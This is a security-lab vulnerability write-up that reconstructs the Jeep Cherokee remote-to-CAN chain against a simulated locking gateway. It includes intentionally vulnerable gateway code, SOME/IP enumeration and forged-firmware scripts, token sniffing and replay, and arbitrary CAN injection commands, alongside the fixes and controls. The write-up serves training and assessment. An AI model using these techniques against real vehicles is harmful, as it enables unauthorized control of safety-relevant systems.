---
id: "AUTO-01 / AUTO-05 / AUTO-02"
title: "Remote-to-CAN kill chain (2015 Jeep Cherokee reconstruction)"
category: Automotive
status: DONE
severity: Critical
owasp: "OWASP IoT Top 10 (2018): I2 Insecure Network Services (AUTO-01, AUTO-02), I4 Lack of Secure Update Mechanism (AUTO-05), I7 Insecure Data Transfer (secondary). Native framing is UNECE R155 Annex 5 and ISO/SAE 21434, see Certification mapping."
cwe: "CWE-306 (Missing Authentication for Critical Function) / CWE-347 (Improper Verification of Cryptographic Signature) / CWE-494 (Download of Code Without Integrity Check) / CWE-345 (Insufficient Verification of Data Authenticity)"
source_docs:
  - "stages/01_spec/output/canary-jeepchain-spec.md"
  - "stages/02_implement/output/manifest.md"
affected_components:
  - "labs/canary/files/opt/canary/someip_gateway.py"
  - "labs/canary/files/etc/init.d/canary-gateway"
  - "labs/canary/files/etc/config/canary"
  - "labs/canary/tools/reflash_gw.py"
verified_date: "2026-07-08"
---

## Why It Matters

This is the attack that put automotive cybersecurity into regulation. In 2015 Miller and Valasek reached a Jeep Cherokee over the cellular network, landed on its Uconnect head unit through an exposed unauthenticated command port, then abused an unsigned firmware update to reprogram the V850 gateway chip that sat between the head unit and the vehicle CAN buses. Once that gateway stopped filtering, they injected arbitrary CAN messages and controlled the brakes, engine and steering. The recall covered 1.4 million vehicles, and the architectural lesson was blunt: the head unit and the safety-critical ECUs shared a bus whose only guard was a gateway that could be reflashed.

CANary reproduces exactly that chain against a safe actuator (central locking). The Central Gateway (CGW) is shipped as a filtering gateway: the only thing it puts on CAN is the single whitelisted `LOCK_CMD` it derives from an authenticated `SetLock`. The legitimate lock interface is authenticated, so an attacker cannot simply call it. The compromise happens the way it happened in the real case, through an exposed management interface and an unsigned firmware update, not through the front door. The finding is a chain of three distinct weaknesses that a certification assessment maps to three separate R155 threat categories.

| Phase           | Real Jeep mechanism                                                               | CANary finding                       | CWE               |
| --------------- | --------------------------------------------------------------------------------- | ------------------------------------ | ----------------- |
| Initial access  | Uconnect D-Bus command port (6667) exposed to the internet with no authentication | AUTO-01 exposed management interface | CWE-306           |
| Escalation      | Unsigned firmware rewrite of the V850 gateway over the update channel             | AUTO-05 unsigned firmware update     | CWE-347 / CWE-494 |
| Physical action | Arbitrary CAN injection once the gateway no longer filters                        | AUTO-02 arbitrary CAN injection      | CWE-306 / CWE-345 |

## The load-bearing invariant

The property the lab is built on: the running gateway has no code path that emits a CAN frame outside its policy. `RelayFrame` (arbitrary CAN) is refused unless the active firmware policy has set `allow_raw=1`, and only `UpdateFirmware` can set it, and `UpdateFirmware` never transmits CAN itself. The unsigned reflash is therefore the only path from the network to an arbitrary bus frame. (Lock actuation specifically has a second path once there is legitimate traffic to sniff, because the SetLock token is cleartext: sniff-and-replay actuates the lock without the reflash. Reaching any other id still requires it.) If any unauthenticated path could inject an arbitrary frame without first replacing the firmware artifact, the reflash would be decorative and the exercise crude. That invariant is what the reproduction below and the self-check exercise.

## Root Cause

### AUTO-01 and AUTO-05: exposed, unauthenticated, unsigned update

The gateway runs a second SOME/IP endpoint on UDP `30510`, the analog of Uconnect's exposed D-Bus command port. In vulnerable mode it binds every interface and applies whatever firmware it receives with no authentication and no signature check.

```python
# labs/canary/files/opt/canary/someip_gateway.py
def apply_firmware(blob, mode, fw_key, path=POLICY_PATH):
    # blob = signature(32) || policy_body. AUTO-05: in vulnerable mode the
    # signature is NEVER checked, any firmware is applied.
    if len(blob) < 32:
        return False
    sig, body = blob[:32], blob[32:]
    if mode == 'secure':                                     # only 'secure' verifies the signature
        expected = hmac.new(fw_key.encode(), body, hashlib.sha256).digest()
        if not hmac.compare_digest(sig, expected):
            return False
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb') as f:
        f.write(body)                                        # apply verbatim, no origin, no version
    return True


def mgmt_server(mode, mgmt_port, fw_key):
    m = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    m.bind(('127.0.0.1' if mode == 'secure' else '0.0.0.0', mgmt_port))   # AUTO-01: exposed on all ifaces
    while True:
        pkt, addr = m.recvfrom(4096)
        ...
        ok = apply_firmware(payload, mode, fw_key)           # AUTO-01: no authentication at all
```

The firmware body is a tiny policy artifact (`allow_raw=1`), an honest abstraction of the V850 machine-code rewrite. No uploaded code is executed. The weakness modelled is the one the real attack exploited: the update is neither authenticated at the transport nor verified for authenticity of content.

### AUTO-02: arbitrary CAN relay, gated by the firmware

The shipped firewall exposes only `SetLock` (which requires the token) and `GetLockState`. The malicious firmware flips `allow_raw`, which is the sole gate on `RelayFrame`. After the reflash the gateway relays any frame the attacker supplies, with no per-id whitelist.

```python
# labs/canary/files/opt/canary/someip_gateway.py  (main service loop)
        if method == M_SETLOCK:
            ok, val = check_token(payload, token)            # legit interface: token required
            if not ok:
                udp.sendto(someip_pack(SERVICE_ID, M_SETLOCK, MT_ERROR, client, session, b'', 0x07), addr)
                continue                                     # front door stays closed
            can.send(can_pack(LOCK_CMD_ID, bytes([val])))
            ...
        elif method == M_RELAYFRAME and len(payload) >= 2:
            if read_policy()['allow_raw']:                   # AUTO-02: only true after the unsigned reflash
                can_id = (payload[0] << 8) | payload[1]
                can.send(can_pack(can_id, payload[2:10]))    # arbitrary CAN, no whitelist
```

`check_token` compares the request prefix against `canary.main.setlock_token` with `hmac.compare_digest`, so a tokenless or wrong-token `SetLock` never reaches `can.send`. This is what forces the attacker onto the reflash path.

## Steps to Reproduce

The tester is on the PC. `someip_client.py` is the legitimate head-unit client, `reflash_gw.py` is the attacker tool. Both are under `src/labs/canary/tools/` and are not part of the vehicle image.

```bash
# 1. The front door is closed: a tokenless SetLock is rejected, no CAN emitted.
python3 tools/someip_client.py 192.168.2.1 unlock
# -> rejected (bad or missing token)

# 2. The legitimate head unit, holding the token, may lock/unlock (this is allowed).
python3 tools/someip_client.py 192.168.2.1 lock AGL-HEADUNIT-7c2f
# -> locked

# 3. The chain: push an UNSIGNED firmware to the exposed management port, then
#    inject LOCK_CMD 0x120 with 0x00 to unlock the car WITHOUT the token.
python3 tools/reflash_gw.py 192.168.2.1
# -> reflash: accepted
# -> inject 0x120 data=00: ok

# 4. The gateway now relays ANY id, proving it no longer filters (no whitelist).
python3 tools/reflash_gw.py 192.168.2.1 7df 0201
# -> inject 0x7df data=0201: ok
```

Observe it on the wire. With the two CAN modules and a USB-CAN adapter on the PC:

```bash
candump can0
# step 3 -> 120#00 (unlock) and the BCM's 121#00 status follow
# step 4 -> 7DF#0201 appears on the bus, an id the gateway would never emit on its own
```

On the Pi in simulation, the BCM actuator state follows the injected `LOCK_CMD`:

```bash
ssh root@192.168.2.1 'cat /tmp/canary/lock_state'
# -> unlocked   (after step 3, achieved with no token)
```

## Attack walkthrough

Steps to Reproduce above is the shortcut, it hands you the ports, the token, the firmware format and the CAN ids. This section is the path a tester actually walks, starting from nothing but network access to the vehicle. Each phase is an investigation: what you run, what you observe, what it means, and where it leads. The lab ships reference scripts you can use at the exploitation stage, the reconnaissance is standard tooling plus a few lines of Python you would write yourself.

Tooling: `nmap` for port discovery, `tcpdump` or Wireshark with its SOME/IP dissector for protocol identification, Python standard-library sockets or Scapy's `someip` layer for crafting probes and payloads, `tar` / `binwalk` / `strings` for firmware static analysis, the AGL head unit's `carctl` / `lock-ui` central-locking control (the legitimate traffic to sniff), and the lab's `someip_client.py` and `reflash_gw.py`.

Attacker position: the PC sits on the vehicle network (`192.168.2.0/24`, vehicle at `192.168.2.1`), with no credentials and no prior knowledge of the services. How you reach that network in the first place is the threat-model note below.

### Getting onto the vehicle network (threat model)

Phase 1 assumes you are already on the vehicle network. In a real engagement that access is a step of its own, and it comes two ways.

Physical access:

- The OBD-II port under the dash reaches the diagnostic bus. A plugged-in adapter or dongle puts you on the vehicle's network.
- Diagnostic Ethernet (DoIP, ISO 13400) carries diagnostics over automotive Ethernet, reachable through the OBD connector's Ethernet pins or a dedicated port. You connect a cable, take an address on the diagnostic network, and speak to ECUs over DoIP or SOME/IP. This is the closest analog of the CANary setup, a tester cabled to the vehicle's diagnostic Ethernet.
- Opening the car and tapping a bus or an ECU debug header.

Remote access, no proximity:

- A cellular telematics unit that keeps the car online. The attacker scans the carrier's IP ranges, finds a vehicle whose service is exposed, and connects over the internet. This is the Jeep route, and once on the telematics unit you are a node on the internal network.
- The car's Wi-Fi hotspot with a weak or default key, or Bluetooth into the head unit.
- Aftermarket cellular or Bluetooth OBD dongles (insurance, fleet). They sit on the CAN and carry their own radio, so compromising the dongle is remote-to-CAN, a common real-world bridge.
- A pivot from the manufacturer's backend or cloud, which can reach the connected fleet. That is the connected-car surface, a later CANary phase.

What CANary abstracts: the lab starts you on the vehicle Ethernet, which stands for a tester cabled to the diagnostic Ethernet (physical), or a foothold on a connected node such as the telematics unit or head unit that lives on that network (remote, the Jeep model). Real in-vehicle networks are segmented, the connected node on a low-trust segment and the safety CAN behind a gateway, so getting in usually means reaching the low-trust segment and pivoting through the gateway. CANary collapses the segments into one Ethernet for now and the gateway is the CGW. When the AGL head unit is live the management interface binds internal-only, which makes the pivot explicit: you must compromise the head unit before you can reach the gateway, exactly as the Jeep chain pivoted through the Uconnect IVI.

### Phase 1 - Reconnaissance: what is reachable

Scan the vehicle. SOME/IP runs over UDP, usually in the 30xxx range.

```bash
nmap -sU -p 30000-30600 192.168.2.1
# 30509/udp open|filtered
# 30510/udp open|filtered
```

![[Canary/Vulns/Automotive/images/AUTO-01-nmap.png]]

UDP scans are unreliable, a silent service reads as `open|filtered`, so treat these as candidates and confirm each by talking to it. A SOME/IP service answers a well-formed request and ignores noise, which is itself a fingerprint.

### Phase 2 - Identify the protocol and enumerate the service

Three dynamic ways to learn the surface without reading the firmware, in order of how much they give you.

**Sniff legitimate traffic (the richest).** You do not generate the traffic, you make the vehicle generate it. In a gray-box position (cabin or IVI access) you operate the car's own central-locking control on the AGL head unit, or you simply wait for the driver to lock the car. The head unit holds the token and speaks SOME/IP, so the request is genuine. Start a capture, then have the lock actuated from the IVI:

```bash
tcpdump -i eth0 -X 'udp port 30509'               # Wireshark decodes SOME/IP natively
# on the AGL head unit the occupant presses Lock on the IVI screen (agl/lock-ui),
# or runs the control from the console:  carctl lock
```

Each lock or unlock is one authenticated `SetLock` on the wire. The capture hands you service `0x1401`, method `0x0001`, and the payload, and because SOME/IP is cleartext that payload carries the head unit's token in the clear (`41 47 4c 2d ...` = `AGL-...`), a credential recovered just by watching the occupant use the car. That is OWASP I7, and it opens the AUTO-02 replay path: replay the captured `SetLock` from anywhere on the network and the lock actuates with no reflash and no cabin access.

**Query Service Discovery.** SOME/IP has a discovery protocol on UDP `30490`. Send a `FindService` (a SOME/IP-SD message, service `0xFFFF` method `0x8100`, one line of Scapy or a crafted packet) and the gateway answers `OfferService`, handing you the service and its endpoint with no guessing:

```
-> OfferService: service 0x1401, instance 0x0001, endpoint 192.168.2.1:30509/UDP
```

You do not need the firmware to craft that `FindService`. SOME/IP and its Service Discovery are a public AUTOSAR standard, so the header layout and the SD message (service `0xFFFF`, method `0x8100`, with its entry and option format) come straight from the AUTOSAR SOME/IP and SOME/IP-SD specifications. Off-the-shelf tools already speak them: Scapy ships `scapy.contrib.automotive.someip`, and `vsomeip` (the open-source COVESA stack) does the SD handshake natively. The hand-rolled snippets in this walkthrough are only the minimal form of what those tools do, and even without the spec a single captured SOME/IP frame is enough because Wireshark labels every field.

What no specification can give you is this ECU's own values, the service id `0x1401`, its methods and the token. Those are discovered, not guessed: from the `OfferService` reply, from sniffed traffic, or from the error-code enumeration below. In a production vehicle it is easier still, SD is multicast and continuous, so an attacker recovers the whole service catalog just by listening. The lab ships only the `FindService` responder, so here you send the query, which models that active-discovery step.

**Active enumeration (no traffic and no SD to observe).** A SOME/IP header is a fixed 16-byte layout: a 32-bit Message ID (`service << 16 | method`), a length, a Request ID, then protocol, interface, message-type and return-code bytes. Wireshark decodes it directly. To confirm `30509` and see what lives there, send a minimal request and read the header back:

```python
import socket, struct
def someip(service, method, payload=b''):
    mid = (service << 16) | method
    return struct.pack('>IIIBBBB', mid, 8 + len(payload), 0x00010001, 1, 1, 0, 0) + payload
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)
# guess a service id and a read-only-looking method, watch for a valid SOME/IP reply
s.sendto(someip(0x1401, 0x0002), ('192.168.2.1', 30509))
r = s.recvfrom(1024)[0]
print('service=%#06x method=%#06x msgtype=%#x payload=%s'
      % (int.from_bytes(r[0:2], 'big'), int.from_bytes(r[2:4], 'big'), r[14], r[16:].hex()))
# -> service=0x1401 method=0x0002 msgtype=0x80 payload=00
```

A `0x80` (RESPONSE) reply confirms SOME/IP, service `0x1401`, and a one-byte state (`00`). You are talking to a stateful service that reports a boolean. Sweep the method ids and classify each reply:

```python
for m in range(0x0001, 0x0010):
    s.sendto(someip(0x1401, m), ('192.168.2.1', 30509))
    r = s.recvfrom(1024)[0]
    print('method %#06x -> msgtype %#x rc %#x' % (m, r[14], r[15]))
# 0x0001 -> 0x81 0x01  E_NOT_OK          (exists, refused -> authenticated)
# 0x0002 -> 0x80 0x00  RESPONSE          (a readable state)
# 0x0003 -> 0x81 0x09  E_MALFORMED       (exists, wants a longer payload)
# others -> 0x81 0x03  E_UNKNOWN_METHOD  (does not exist)
```

Method `0x0001` answers with an error, not silence, so it exists but rejects what you sent. Guessing it is a setter, retry with a one-byte argument:

```python
s.sendto(someip(0x1401, 0x0001, b'\x01'), ('192.168.2.1', 30509))
print('setlock ->', hex(s.recvfrom(1024)[0][14]))   # -> 0x81 (ERROR)
```

Still rejected, for every argument. A setter that refuses everything is authenticated, there is a credential in the request you do not have, though if you sniffed traffic above you already have it. The standard return codes make the sweep precise: `0x0003` answers `E_MALFORMED`, so it exists and wants a longer payload, you just do not yet know what it does. Service ids enumerate the same way, a wrong service answers `E_UNKNOWN_SERVICE`. Note the second port `30510` from Phase 1. What `0x0003` relays, the firmware format, and the CAN map are the semantic layer, which you get by correlating captures with CAN traffic or from static analysis (Phase 3).

**Doing Phase 2 with real tools (Scapy + Wireshark).** The snippets above show the raw bytes, but in practice you send with Scapy and read with Wireshark, and neither needs the firmware. Scapy is preinstalled on Kali (otherwise `pip install scapy`), and its `scapy.contrib.automotive.someip` layer speaks SOME/IP and SOME/IP-SD directly. The following is verified against this lab:

```python
from scapy.contrib.automotive.someip import SOMEIP, SD, SDEntry_Service
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(2)

# 1) Service Discovery: a FindService for service 0x1401 -> the gateway answers OfferService
entry = SDEntry_Service(type=0, srv_id=0x1401, inst_id=0xFFFF, major_ver=0xFF, ttl=3, minor_ver=0xFFFFFFFF)
find = SOMEIP(srv_id=0xFFFF, sub_id=0x8100, msg_type=2) / SD(flags=0xC0, entry_array=[entry])
s.sendto(bytes(find), ('192.168.2.1', 30490))
SOMEIP(s.recvfrom(1024)[0]).show()      # OfferService: service 0x1401 @ 192.168.2.1:30509/UDP

# 2) Method enumeration on the service port, read the standard return codes
for m in (0x0001, 0x0002, 0x0003, 0x00ff):
    s.sendto(bytes(SOMEIP(srv_id=0x1401, sub_id=m, msg_type=0)), ('192.168.2.1', 30509))
    r = SOMEIP(s.recvfrom(1024)[0])
    print(f'method {m:#06x} -> msg_type={r.msg_type} retcode={r.retcode}')
# 0x0001 -> 129/1  ERROR / E_NOT_OK (authenticated)     0x0002 -> 128/0  RESPONSE (readable)
# 0x0003 -> 129/9  ERROR / E_MALFORMED (exists)          0x00ff -> 129/3  ERROR / E_UNKNOWN_METHOD
```

`SOMEIP(...).show()` prints the fields by name (`msg_type` as `NOTIFICATION` / `RESPONSE` / `ERROR`, `retcode` as `E_OK` / `E_NOT_OK` / `E_MALFORMED_MESSAGE` / `E_UNKNOWN_METHOD`), and the OfferService reply already carries the service id and the IPv4 endpoint option, so Scapy alone hands you service `0x1401` at `192.168.2.1:30509`.

To read a frame in Wireshark:

1. Capture on the interface facing the vehicle with `udp.port in {30490,30509,30510}`, or open the saved `.pcap`.
2. Wireshark has a SOME/IP dissector but it is off for these non-standard ports. Right-click one of the packets, choose `Decode As...`, and set the UDP port (`30509`, `30510`, `30490`) to `SOMEIP`. The SD messages on `30490` get the SOME/IP-SD sub-dissection on their own.
3. The detail pane now shows the fields by name under `SOME/IP Protocol`: `Service ID`, `Method ID`, `Message Type`, `Return Code`, and the payload, with no hex arithmetic.
4. On an `OfferService`, expand `SOME/IP Service Discovery` and read the entry (service `0x1401`) and the IPv4 endpoint option (`192.168.2.1`, port `30509`, UDP).
5. On the authenticated `SetLock` you sniffed, select the SOME/IP payload and read the ASCII in the bytes pane, `AGL-HEADUNIT-7c2f`, the token in the clear.
6. Useful display filters: `someip.serviceid == 0x1401`, `someip.messagetype == 0x81` (only the error replies of the sweep), `someip.methodid == 3` (RelayFrame), `someipsd.entry.serviceid == 0x1401` (the SD offer).

![[AUTO-01-wireshark-find-offer.png]]

![[AUTO-01-discovery-protocol.png]]

![[AUTO-01-service-id.png]]

### Phase 3 - Static analysis: recover the design from the firmware

Black-box enumeration proves services exist, static analysis proves how they work. This is the automotive tester's core move, the same class of work Miller and Valasek did on the V850 image, and you do not need a live shell on the ECU, you need the firmware. Obtain the ECU update package the vendor ships over the air, or a flash dump, and unpack it. In this lab that package is `canary.tar.gz`:

```bash
tar xzf canary.tar.gz                                   # a real flash dump: binwalk -e dump.bin
strings -n 6 opt/canary/someip_gateway.py               # a stripped binary: strings + a disassembler
```

Reading `opt/canary/someip_gateway.py` and `etc/config/canary` recovers the whole design:

- Two SOME/IP services: `0x1401` on `someip_port` 30509 with `SetLock` `0x0001` (token-gated), `GetLockState` `0x0002` and `RelayFrame` `0x0003`, and `0x1402` on `mgmt_port` 30510 with `UpdateFirmware` `0x0001`. `RelayFrame` is the method the active sweep flagged as present (`E_MALFORMED` to a short payload) but could not explain, the source is what shows it relays raw CAN.
- `SetLock` compares a token prefix against `canary.main.setlock_token`. That is why it refused you, and you now see you do not need it if you can reach CAN another way.
- `UpdateFirmware` applies a firmware `blob = signature(32) || policy_body` and only verifies the signature when `mode == 'secure'`. The shipped `mode` is `vulnerable`, so the signature is never checked.
- `RelayFrame` transmits an arbitrary CAN frame, but only if the active policy has `allow_raw=1`, and that flag is set only by applying a firmware whose body is `allow_raw=1`.
- The CAN map: `LOCK_CMD` id `0x120`, one data byte, `0x00` unlock and `0x01` lock.

The attack now writes itself: reach `30510`, push an unsigned firmware that sets `allow_raw=1`, then call `RelayFrame` with `0x120 00`, bypassing the token entirely.

### Phase 4 - Confirm the exposed update interface (AUTO-01)

Probe `30510` as service `0x1402`. Send a deliberately short firmware and read the reply, to confirm the endpoint is live and takes your input with no authentication:

```python
import socket
import struct

def someip(service_id, method_id, payload):
    # 16-byte SOME/IP header + payload.
    # Message ID: Service ID (2 bytes) + Method ID (2 bytes).
    message_id = struct.pack('>HH', service_id, method_id)
    # Length: the fixed 8 header bytes that follow + the payload length.
    length = struct.pack('>I', 8 + len(payload))
    # Request ID: Client ID (0x0000) and Session ID (0x0001).
    request_id = struct.pack('>HH', 0x0000, 0x0001)
    # Protocol v1, Interface v1, Message Type REQUEST (0x00), Return Code E_OK (0x00).
    # The gateway drops anything whose message type is not 0x00, so REQUEST is required.
    protocol_vars = struct.pack('>BBBB', 0x01, 0x01, 0x00, 0x00)
    return message_id + length + request_id + protocol_vars + payload

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5.0)

# A deliberately short firmware (4 bytes): too short to be a valid signature(32) || body.
s.sendto(someip(0x1402, 0x0001, b'\x00' * 4), ('192.168.2.1', 30510))
print('updatefw last byte ->', s.recvfrom(1024)[0][-1])
# -> 0    (rejected as malformed, but answered with no auth challenge and no credential asked)
```

It processed your request and answered without ever asking for a credential. An unauthenticated firmware-update interface, reachable from the network. This is the entry (AUTO-01).

### Phase 5 - Defeat update integrity (AUTO-05)

The design says the signature is unchecked in vulnerable mode. Test it: craft a firmware with a bogus 32-byte signature and a benign body, and see if it is accepted:

```python
import socket
import struct

def someip(service_id, method_id, payload):
    # 16-byte SOME/IP header + payload.
    # Message ID: Service ID (2 bytes) + Method ID (2 bytes).
    message_id = struct.pack('>HH', service_id, method_id)
    # Length: the fixed 8 header bytes that follow + the payload length.
    length = struct.pack('>I', 8 + len(payload))
    # Request ID: Client ID (0x0000) and Session ID (0x0001).
    request_id = struct.pack('>HH', 0x0000, 0x0001)
    # Protocol v1, Interface v1, Message Type REQUEST (0x00), Return Code E_OK (0x00).
    # The gateway drops anything whose message type is not 0x00, so REQUEST is required.
    protocol_vars = struct.pack('>BBBB', 0x01, 0x01, 0x00, 0x00)
    return message_id + length + request_id + protocol_vars + payload

TARGET_IP = '192.168.2.1'
TARGET_PORT = 30510

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(5.0)  # 5 s cap so the console does not hang if there is no reply

try:
    print(f"[-] Sending a forged/unsigned firmware to {TARGET_IP}:{TARGET_PORT}...")
    # Payload: 32 zero bytes (bogus signature) + a benign body 'noop' (36 bytes total).
    forged_payload = b'\x00' * 32 + b'noop'
    s.sendto(someip(0x1402, 0x0001, forged_payload), (TARGET_IP, TARGET_PORT))

    response, src_addr = s.recvfrom(1024)
    # The gateway reply payload is a single byte: 1 = accepted, 0 = rejected.
    accepted = (response[-1] == 1)
    print('bogus-signed firmware accepted?', accepted)

    if accepted:
        print("[ALERT] The device applied a firmware with no valid signature. Vulnerability confirmed.")
    else:
        print("[OK] The device rejected the forged firmware (last byte is not 1).")

except socket.timeout:
    print("[ERROR] No reply from the device. Check the link, or whether the port is open.")
except Exception as e:
    print(f"[ERROR] Execution failed: {e}")
finally:
    s.close()
```

Accepted with an all-zero signature. The update path verifies nothing (AUTO-05). Swap the body for the one that matters, `allow_raw=1`, which flips the gateway from firewall to bridge.

![[auto05-integrity-defeated.png]]
### Phase 6 - Weaponize and achieve impact (AUTO-02)

You now hold every fact: the mgmt endpoint, the unsigned-firmware bypass, the `allow_raw` flag, and the CAN map. Chain them. Write the dozen lines yourself, or use the lab's reference implementation, `reflash_gw.py`, which does exactly this:

![[auto05-reflash-tool.png]]

The impact evidence in simulation is the actuator state file, which stands in for the doors physically unlocking or a `candump` of `0x120` on the real bus, it is the tester's observation channel, not an attacker capability.

Prove the gateway no longer filters by injecting an id it would never emit on its own:

![[auto05-anyid-valid.png]]

In this lab the actuator is the lock. In the real Jeep the same arbitrary-injection primitive drove the brakes, engine and steering. The gateway is now an attacker-controlled bridge, and the one thing that stood between the network and the safety bus, an unsigned firmware check, is gone.

### What made each phase possible

- Entry was a management interface that was reachable from the network and unauthenticated (AUTO-01).
- Escalation was an update that trusted its own input (AUTO-05).
- Impact was a bus with no message authentication, behind a gateway that could be told to stop filtering (AUTO-02).

Remove any one of the three, authenticate the management interface, sign the firmware, or authenticate the bus, and the chain breaks. That is the defense in depth the assessment checks for, and secure mode (`mode=secure`) demonstrates the first two closing.

## Expected Result

A tokenless `SetLock` is rejected and emits nothing on CAN. The unsigned firmware is accepted by the exposed management endpoint. After the reflash the gateway relays attacker-supplied arbitrary CAN, which unlocks the car with no token and places unrelated ids such as `0x7DF` on the bus. The gateway has gone from a filtering firewall to an attacker-controlled bridge, exactly the state of the reflashed V850.

## How It Should Be

Secure mode (`canary.main.mode=secure`) closes all three. The management endpoint binds internal-only so it is not reachable from the external network, `UpdateFirmware` verifies an HMAC-SHA256 signature over the firmware body against `canary.main.fw_key` and rejects an unsigned or forged image, so `allow_raw` can never be flipped by an attacker and `RelayFrame` stays refused. The `SetLock` token is required in both modes. In a real vehicle the equivalents are firmware signed by a vendor key and verified on-device before flash, a gateway that authenticates and authorizes the update source, and a message-filtering gateway whose policy is not attacker-writable. The deeper architectural fix, restored in CANary when the AGL head unit is live, is to keep the management interface off the external network entirely so an attacker must first compromise the head unit.

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Update integrity | Verify a vendor signature before applying firmware | Reject unsigned or tampered images (AUTO-05) |
| Update auth | Authenticate and authorize the update source | Stop anonymous reflash (AUTO-01) |
| Segregation | Keep the management interface off the external network | Force a head-unit pivot, remove direct exposure (AUTO-01) |
| Gateway filtering | Message-filtering policy that is not attacker-writable | Preserve the firewall so arbitrary CAN is unreachable (AUTO-02) |
| Bus integrity | Authenticated CAN (SecOC) on safety-relevant frames | Reject spoofed/injected frames on the bus (AUTO-02) |

## Verification Checklist

- [ ] A tokenless `SetLock` is rejected and emits no `LOCK_CMD` on CAN
- [ ] `SetLock` with the correct token locks, and `GetLockState` reflects it
- [ ] `RelayFrame` before any reflash is refused and emits nothing (the invariant)
- [ ] `UpdateFirmware` with an unsigned blob is accepted in vulnerable mode
- [ ] After the reflash, `RelayFrame` injects `LOCK_CMD 0x120#00` and unlocks with no token
- [ ] After the reflash, an unrelated id such as `0x7DF` also reaches the bus (no whitelist)
- [ ] In secure mode, `UpdateFirmware` with an unsigned or forged blob is rejected and `RelayFrame` stays refused
- [ ] `tools/test_canary.py` passes (token gate, invariant, unsigned-accept, signed-verify)

## Deviations from the real case

These are modelled deliberately and named so the lab does not imply fidelity it does not have.

1. One process, not two chips. CANary collapses the head unit and the CAN-facing gateway into one CGW process in the simulation-now phase. The real reflash was forced by hardware separation (the OMAP application processor could not touch CAN, only the V850 could). The separation is modelled in software by the firewall policy and the update-only management interface, and the genuine two-worlds separation is restored when AGL is live, at which point the management interface binds internal-only and the attacker must pivot through AGL.
2. Policy artifact, not machine code. `UpdateFirmware` consumes a policy artifact rather than executing uploaded code. The modelled weakness (missing signature verification, gateway behaviour changes) is faithful, the mechanism is an abstraction.
3. Reset on reboot, not persistent flash. The reflash persists for the session and a reboot or lab reload restores the firewall, a deliberate clean slate for a training lab. The real V850 reflash persisted in nonvolatile flash.
4. The actuated function is the lock, a safe stand-in for the Jeep's brakes and steering. The chain shape is identical.

## Certification mapping

Findings carry the dual mapping a TIC assessment report uses. The R155 Annex 5 threat categories are named below. Exact Annex 5 clause numbers are pinned against the regulation text and are intentionally not invented here.

- AUTO-01 maps to unauthorized access through an exposed interface, under the communication-channels and back-end/interface threat categories.
- AUTO-05 maps to the software-update threat category (compromise of the update procedure), which also engages UNECE R156 and ISO 24089.
- AUTO-02 maps to the injection of malicious messages onto the in-vehicle network, under the communication-channels category.

The OWASP IoT Top 10 (2018) cross-map, as a secondary lens, is:

- AUTO-01 (exposed unauthenticated management endpoint) -> I2 Insecure Network Services.
- AUTO-05 (unsigned firmware update) -> I4 Lack of Secure Update Mechanism.
- AUTO-02 (unauthenticated CAN injection through the subverted gateway) -> I2 Insecure Network Services, with I7 Insecure Data Transfer and Storage for the plaintext, integrity-free bus.

The full OWASP IoT Top 10 coverage matrix for CANary is in [`../README.md`](../README.md).

For ISO/SAE 21434, the deliberately flawed cybersecurity case the assessor must break is that the gateway trusts unauthenticated management traffic and unsigned firmware, and once reflashed applies no message-filtering integrity to the CAN bus. This is the TARA gap the assessment is designed to surface.

## Related Vulnerabilities

- [Vulnerability roadmap](../README.md): the AUTO-01, AUTO-05 and AUTO-02 rows and the Jeep kill-chain note.
- AUTO-04 (weak UDS SecurityAccess over ISO-TP): a separate diagnostic surface, deferred until `kmod-can-isotp` is added.
- The replay of an authenticated `SetLock` captured on the wire is the AUTO-02 replay variant, distinct from this chain and relevant once the AGL head unit emits authenticated traffic.
